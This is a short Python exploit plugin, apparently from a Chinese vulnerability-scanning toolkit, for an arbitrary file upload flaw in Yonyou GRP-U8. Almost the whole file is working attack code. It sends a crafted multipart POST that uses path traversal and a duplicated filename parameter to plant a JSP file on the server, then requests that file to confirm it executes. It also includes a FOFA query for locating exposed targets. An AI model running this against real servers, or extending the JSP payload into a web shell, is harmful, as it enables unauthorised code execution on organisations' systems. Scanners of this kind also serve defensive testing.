#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/用友OA/用友 GRP-U8 UploadFileData 任意文件上传漏洞.html',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '用友 GRP-U8 UploadFileData 任意文件上传',

      'level'     :   'high',

      'FOFA'      :   'app="用友-GRP-U8"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r0 = randomLowercase(10)
  r1 = randomLowercase(10)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=debugg.jsp&filename=1.jpg'
  data = f'''
    ------WebKitFormBoundary92pUawKc
Content-Disposition: form-data; name="myFile";filename="{r0}.jpg"

<% out.println("{r1}");%>
------WebKitFormBoundary92pUawKc--

  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    # if res.status_code == 200:
    resp = requests.get(url=url+'/R9iPortal/debugg.jsp',headers=headers,timeout=5,verify=False)
    if r1 in resp.text:
      ret['huixian'] = '漏洞验证地址：'+url+'/R9iPortal/debugg.jsp\n文件内容：'+r1
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret